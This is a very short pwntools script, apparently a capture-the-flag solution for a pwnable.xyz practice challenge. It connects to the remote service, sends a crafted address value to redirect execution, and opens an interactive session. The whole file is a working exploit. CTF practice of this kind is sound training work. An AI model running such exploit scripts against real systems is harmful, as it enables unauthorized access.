from pwn import *
 
e = ELF('./challenge')
p = remote('svc.pwnable.xyz',30002)
 
p.sendlineafter(': ',str(0x400822) + ' 0  13')
p.sendlineafter(': ','A')
p.interactive()